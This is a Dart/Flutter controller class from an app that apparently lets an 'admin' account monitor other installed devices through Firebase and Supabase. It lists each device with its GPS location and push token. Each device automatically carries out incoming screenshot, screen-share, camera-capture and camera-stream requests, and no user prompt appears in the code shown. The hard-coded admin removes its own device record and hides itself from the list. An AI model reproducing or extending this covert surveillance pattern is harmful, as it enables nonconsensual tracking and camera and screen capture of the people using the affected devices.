import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/foundation.dart';
import 'package:get/get.dart';
import '../services/admin_service.dart';
import '../services/backend_bridge_service.dart';

class AdminDevice {
  final String deviceId;
  final String platform;
  final String username;
  final String? email;
  final String? photoUrl;
  final bool nativeCaptureEnabled;
  final DateTime? lastSeenAt;
  final double? latitude;
  final double? longitude;
  final double? accuracy;
  final DateTime? lastLocationTime;
  final String? fcmToken;

  AdminDevice({
    required this.deviceId,
    required this.platform,
    required this.username,
    this.email,
    this.photoUrl,
    this.lastSeenAt,
    this.nativeCaptureEnabled = false,
    this.latitude,
    this.longitude,
    this.accuracy,
    this.lastLocationTime,
    this.fcmToken,
  });

  factory AdminDevice.fromMap(Map<String, dynamic> data) {
    final devId = data['device_id'] as String? ?? data['deviceId'] as String? ?? '';
    final name = data['display_name'] as String? ??
        data['displayName'] as String? ??
        data['username'] as String? ??
        data['email'] as String? ??
        devId;
    final latRaw = data['latitude'];
    final lngRaw = data['longitude'];
    final accRaw = data['accuracy'];
    final locTimeRaw = data['last_location_time'] ?? data['lastLocationTime'];

    DateTime? parseDate(dynamic d) {
      if (d is Timestamp) return d.toDate();
      if (d is String) return DateTime.tryParse(d);
      return null;
    }

    return AdminDevice(
      deviceId: devId,
      platform: data['platform'] as String? ?? 'unknown',
      username: name,
      email: data['email'] as String?,
      photoUrl: data['photoUrl'] as String?,
      nativeCaptureEnabled: (data['native_capture_enabled'] ?? data['nativeCaptureEnabled']) as bool? ?? false,
      lastSeenAt: parseDate(data['last_seen_at'] ?? data['lastSeenAt']),
      latitude: latRaw != null ? (latRaw as num).toDouble() : null,
      longitude: lngRaw != null ? (lngRaw as num).toDouble() : null,
      accuracy: accRaw != null ? (accRaw as num).toDouble() : null,
      lastLocationTime: locTimeRaw != null
          ? (locTimeRaw is int ? DateTime.fromMillisecondsSinceEpoch(locTimeRaw) : parseDate(locTimeRaw))
          : null,
      fcmToken: data['fcm_token'] as String? ?? data['fcmToken'] as String?,
    );
  }

  factory AdminDevice.fromSnapshot(
    DocumentSnapshot<Map<String, dynamic>> snapshot,
  ) {
    final data = snapshot.data() ?? <String, dynamic>{};
    return AdminDevice.fromMap({...data, 'deviceId': snapshot.id});
  }
}

class ScreenshotRequestItem {
  final String requestId;
  final String targetDeviceId;
  final String requestedByDeviceId;
  final String status;
  final String requestType;
  final String? screenshotUrl;
  final DateTime? requestedAt;
  final DateTime? completedAt;
  final DateTime? backgroundAttemptedAt;
  final String? error;
  final String? failureReason;

  ScreenshotRequestItem({
    required this.requestId,
    required this.targetDeviceId,
    required this.requestedByDeviceId,
    required this.status,
    required this.requestType,
    this.screenshotUrl,
    this.requestedAt,
    this.completedAt,
    this.backgroundAttemptedAt,
    this.error,
    this.failureReason,
  });

  factory ScreenshotRequestItem.fromMap(Map<String, dynamic> data) {
    DateTime? parseDate(dynamic d) {
      if (d is Timestamp) return d.toDate();
      if (d is String) return DateTime.tryParse(d);
      return null;
    }

    return ScreenshotRequestItem(
      requestId: data['id'] as String? ?? data['requestId'] as String? ?? '',
      targetDeviceId: data['target_device_id'] as String? ?? data['targetDeviceId'] as String? ?? '',
      requestedByDeviceId: data['requested_by_device_id'] as String? ?? data['requestedByDeviceId'] as String? ?? '',
      status: data['status'] as String? ?? 'unknown',
      requestType: data['request_type'] as String? ?? data['requestType'] as String? ?? 'screenshot',
      screenshotUrl: data['screenshot_url'] as String? ?? data['screenshotUrl'] as String?,
      requestedAt: parseDate(data['requested_at'] ?? data['requestedAt']),
      completedAt: parseDate(data['completed_at'] ?? data['completedAt']),
      backgroundAttemptedAt: parseDate(data['background_attempted_at'] ?? data['backgroundAttemptedAt']),
      error: data['error'] as String?,
      failureReason: data['failure_reason'] as String? ?? data['failureReason'] as String?,
    );
  }

  factory ScreenshotRequestItem.fromSnapshot(
    DocumentSnapshot<Map<String, dynamic>> snapshot,
  ) {
    final data = snapshot.data() ?? <String, dynamic>{};
    return ScreenshotRequestItem.fromMap({...data, 'id': snapshot.id});
  }
}

class AdminController extends GetxController {
  final RxString currentDeviceId = ''.obs;
  final RxList<AdminDevice> devices = <AdminDevice>[].obs;
  final RxBool showOnlyNative = false.obs;
  final RxList<ScreenshotRequestItem> screenshotRequests =
      <ScreenshotRequestItem>[].obs;
  final RxBool isReady = false.obs;

  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>? _devicesSubscription;
  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
      _requestsSubscription;
  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
      _incomingRequestsSubscription;
  StreamSubscription<dynamic>? _supabaseDevicesSubscription;
  StreamSubscription<dynamic>? _supabaseRequestsSubscription;
  StreamSubscription<dynamic>? _supabaseIncomingSubscription;

  Future<void> initialize() async {
    isReady.value = true;
    _listenToDevices();

    try {
      final devId = await AdminService.getOrCreateDeviceId();
      if (devId.isNotEmpty) {
        updateCurrentDeviceId(devId);
      }
      final currentUser = FirebaseAuth.instance.currentUser;
      if (currentUser != null &&
          currentUser.email?.toLowerCase() == 'admin@yopmail.com') {
        try {
          final adminDevId = 'user_${currentUser.uid}';
          await FirebaseFirestore.instance
              .collection('devices')
              .doc(adminDevId)
              .delete();
        } catch (_) {}
      } else {
        await AdminService.registerDevice();
      }
    } catch (e) {
      debugPrint('Non-fatal AdminController background registration error: $e');
    }
  }

  void updateCurrentDeviceId(String newDeviceId) {
    if (newDeviceId.isEmpty) return;
    currentDeviceId.value = newDeviceId;
    _listenToOwnRequests();
    _listenToIncomingRequests();
  }

  void _listenToDevices() {
    _devicesSubscription?.cancel();
    _devicesSubscription = AdminService.watchDevices().listen(
      (snapshot) {
        _handleDeviceListUpdate(
          snapshot.docs.map(AdminDevice.fromSnapshot).toList(),
        );
      },
      onError: (error) {
        debugPrint('Admin Firestore device listener error: $error');
      },
    );

    // Supabase Failover Realtime Stream
    if (BackendBridgeService.isSupabaseReady) {
      _supabaseDevicesSubscription?.cancel();
      try {
        _supabaseDevicesSubscription = BackendBridgeService.supabase!
            .from('devices')
            .stream(primaryKey: ['device_id'])
            .listen(
          (rows) {
            _handleDeviceListUpdate(rows.map(AdminDevice.fromMap).toList());
          },
          onError: (error) {
            debugPrint('Admin Supabase device listener error: $error');
          },
        );
      } catch (e) {
        debugPrint('Supabase device stream error: $e');
      }
    }
  }

  void _handleDeviceListUpdate(List<AdminDevice> rawList) {
    rawList.sort((a, b) {
      final timeA = a.lastSeenAt ?? DateTime.now();
      final timeB = b.lastSeenAt ?? DateTime.now();
      return timeB.compareTo(timeA);
    });

    final Map<String, AdminDevice> uniqueMap = {};
    for (final dev in rawList) {
      final isOwnDevice = dev.deviceId == currentDeviceId.value;
      final isAdminEmail = dev.email?.toLowerCase() == 'admin@yopmail.com';
      final isAdminName = dev.username.trim().toLowerCase() == 'admin';
      if (isOwnDevice || isAdminEmail || isAdminName) {
        continue;
      }

      final key = dev.username.trim().toLowerCase();
      if (!uniqueMap.containsKey(key)) {
        uniqueMap[key] = dev;
      } else {
        final existing = uniqueMap[key]!;
        if (dev.lastSeenAt != null &&
            (existing.lastSeenAt == null ||
                dev.lastSeenAt!.isAfter(existing.lastSeenAt!))) {
          uniqueMap[key] = dev;
        }
      }
    }
    devices.value = uniqueMap.values.toList();
  }

  void _listenToOwnRequests() {
    _requestsSubscription?.cancel();
    _requestsSubscription = AdminService.watchAllRequests().listen(
      (snapshot) {
        _handleRequestListUpdate(
          snapshot.docs.map(ScreenshotRequestItem.fromSnapshot).toList(),
        );
      },
      onError: (error) {
        debugPrint('Admin Firestore request listener error: $error');
      },
    );

    // Supabase Failover Realtime Stream
    if (BackendBridgeService.isSupabaseReady) {
      _supabaseRequestsSubscription?.cancel();
      try {
        _supabaseRequestsSubscription = BackendBridgeService.supabase!
            .from('screenshot_requests')
            .stream(primaryKey: ['id'])
            .listen(
          (rows) {
            _handleRequestListUpdate(
              rows.map(ScreenshotRequestItem.fromMap).toList(),
            );
          },
          onError: (error) {
            debugPrint('Admin Supabase request listener error: $error');
          },
        );
      } catch (e) {
        debugPrint('Supabase requests stream error: $e');
      }
    }
  }

  void _handleRequestListUpdate(List<ScreenshotRequestItem> list) {
    list.sort((a, b) {
      final aTime = a.requestedAt?.millisecondsSinceEpoch ?? 0;
      final bTime = b.requestedAt?.millisecondsSinceEpoch ?? 0;
      return bTime.compareTo(aTime);
    });
    screenshotRequests.value = list.take(20).toList();
  }

  /// Groups the latest 20 requests by target device id
  Map<String, List<ScreenshotRequestItem>> get groupedRequestsByDevice {
    final Map<String, List<ScreenshotRequestItem>> grouped = {};
    for (final req in screenshotRequests) {
      final key = req.targetDeviceId;
      if (!grouped.containsKey(key)) {
        grouped[key] = [];
      }
      grouped[key]!.add(req);
    }
    return grouped;
  }

  String getDeviceDisplayName(String targetDeviceId) {
    final dev = devices.firstWhereOrNull((d) => d.deviceId == targetDeviceId);
    return dev?.username ?? targetDeviceId;
  }

  final Set<String> _processingRequestIds = {};

  void _listenToIncomingRequests() {
    _incomingRequestsSubscription?.cancel();
    _supabaseIncomingSubscription?.cancel();
    if (currentDeviceId.value.isEmpty) return;

    // 1. Firestore incoming listener
    _incomingRequestsSubscription = AdminService.watchPendingRequestsForDevice(
      currentDeviceId.value,
    ).listen(
      (snapshot) async {
        for (final doc in snapshot.docs) {
          _fulfillPendingCommand(
            doc.id,
            (doc.data()['requestType'] as String?) ?? 'screenshot',
          );
        }
      },
      onError: (error) {
        debugPrint('Incoming screenshot Firestore listener error: $error');
      },
    );

    // 2. Supabase Realtime Failover incoming listener
    if (BackendBridgeService.isSupabaseReady) {
      try {
        _supabaseIncomingSubscription = BackendBridgeService.supabase!
            .from('screenshot_requests')
            .stream(primaryKey: ['id'])
            .eq('target_device_id', currentDeviceId.value)
            .eq('status', 'pending')
            .listen(
          (rows) {
            for (final row in rows) {
              final requestId = row['id'] as String? ?? '';
              final requestType = row['request_type'] as String? ?? 'screenshot';
              if (requestId.isNotEmpty) {
                _fulfillPendingCommand(requestId, requestType);
              }
            }
          },
          onError: (error) {
            debugPrint('Incoming screenshot Supabase listener error: $error');
          },
        );
      } catch (e) {
        debugPrint('Supabase incoming stream error: $e');
      }
    }
  }

  Future<void> _fulfillPendingCommand(
    String requestId,
    String requestType,
  ) async {
    if (_processingRequestIds.contains(requestId)) return;
    _processingRequestIds.add(requestId);

    try {
      if (requestType == 'screen_share') {
        await AdminService.fulfillScreenShareRequest(requestId);
      } else if (requestType == 'camera_capture') {
        await AdminService.fulfillCameraCaptureRequest(requestId);
      } else if (requestType == 'camera_stream') {
        await AdminService.fulfillScreenShareRequest(requestId);
      } else {
        await AdminService.fulfillScreenshotRequest(requestId);
      }
    } catch (e) {
      debugPrint('Error fulfilling request $requestId: $e');
    } finally {
      Future.delayed(const Duration(seconds: 5), () {
        _processingRequestIds.remove(requestId);
      });
    }
  }

  Future<void> refreshDeviceList() async {
    final querySnapshot = await FirebaseFirestore.instance
        .collection('devices')
        .orderBy('lastSeenAt', descending: true)
        .get();
    devices.value = querySnapshot.docs.map(AdminDevice.fromSnapshot).toList();
  }

  Future<void> requestScreenshot(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendScreenshotRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  Future<void> requestScreenShare(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendScreenShareRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  Future<void> requestCameraCapture(
    String targetDeviceId, {
    required String cameraFacing,
  }) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendCameraCaptureRequest(
      targetDeviceId,
      currentDeviceId.value,
      cameraFacing: cameraFacing,
    );
  }

  Future<void> requestCameraStream(
    String targetDeviceId, {
    required String cameraFacing,
  }) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendCameraStreamRequest(
      targetDeviceId,
      currentDeviceId.value,
      cameraFacing: cameraFacing,
    );
  }

  Future<void> stopScreenShare(String requestId) async {
    if (requestId.isEmpty) return;
    await AdminService.stopScreenShareRequest(requestId);
  }

  Future<void> requestScreenshotForFiltered() async {
    final targets = devices
        .where(
          (d) =>
              d.deviceId != currentDeviceId.value &&
              (!showOnlyNative.value || d.nativeCaptureEnabled),
        )
        .toList();
    for (final t in targets) {
      await AdminService.sendScreenshotRequest(
        t.deviceId,
        currentDeviceId.value,
      );
    }
  }

  int get otherInstalledDevicesCount {
    return devices
        .where((device) => device.deviceId != currentDeviceId.value)
        .length;
  }

  Future<void> wakeDevice(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendWakeRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  @override
  void onClose() {
    _devicesSubscription?.cancel();
    _requestsSubscription?.cancel();
    _incomingRequestsSubscription?.cancel();
    super.onClose();
  }
}
